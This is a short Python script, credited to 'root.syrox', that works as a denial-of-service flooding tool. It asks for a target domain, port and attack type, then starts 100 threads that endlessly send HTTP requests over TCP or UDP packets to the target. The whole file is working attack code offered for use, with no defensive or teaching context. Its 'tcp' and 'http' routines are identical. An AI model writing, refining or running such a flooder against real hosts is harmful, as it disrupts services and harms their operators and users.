import socket
import threading
print("Made by root.syrox")

target = input("Enter target domain: ")
port = int(input("Enter target port: "))
attack = input("Enter attack type (http/udp/tcp): ")

def http_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            s.sendall(b"Host: " + target.encode() + b"\r\n\r\n")
            print("HTTP Attack sent to ", target)
        except:
            print("Connection error")

def udp_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(b"GET /", (target, port))
            print("UDP Attack sent to ", target)
        except:
            print("Connection error")

def tcp_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendall(b"GET / HTTP/1.1\r\n")
            s.sendall(b"Host: " + target.encode() + b"\r\n\r\n")
            print("TCP Attack sent to ", target)
        except:
            print("Connection error")

if attack == "http":
    for i in range(100):
        t = threading.Thread(target=http_attack)
        t.start()
elif attack == "udp":
    for i in range(100):
        t = threading.Thread(target=udp_attack)
        t.start()
elif attack == "tcp":
    for i in range(100):
        t = threading.Thread(target=tcp_attack)
        t.start()
else:
    print("Invalid attack type")
